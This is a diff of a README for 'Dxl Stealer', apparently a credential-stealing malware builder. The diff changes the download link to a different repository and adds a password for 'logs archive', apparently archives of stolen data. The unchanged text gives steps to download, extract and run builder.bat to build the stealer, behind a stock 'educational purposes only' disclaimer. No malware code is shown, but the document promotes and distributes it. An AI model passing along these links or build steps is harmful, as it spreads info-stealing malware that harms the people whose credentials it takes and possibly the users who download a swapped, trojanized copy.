@@ -53,7 +53,7 @@ Dxl
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/ghatolow/Dxl-Stealer/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-YNW/Dxl-StealerV2.0/archive/refs/heads/main.zip)
 
 **Disclaimer:** This program is provided for educational and research purposes only. The creator of this program does not condone or support any illegal or malicious activity, and will not be held responsible for any such actions taken by others who may use this program. By downloading or using this program, you acknowledge that you are solely responsible for any consequences that may result from the use of this program.
 
@@ -135,7 +135,7 @@ Dxl
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Dxl Stealer** folder and double click *builder.bat* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
-
+[logs archive passwords:dxl1234]
 
 
 ## Support the Project
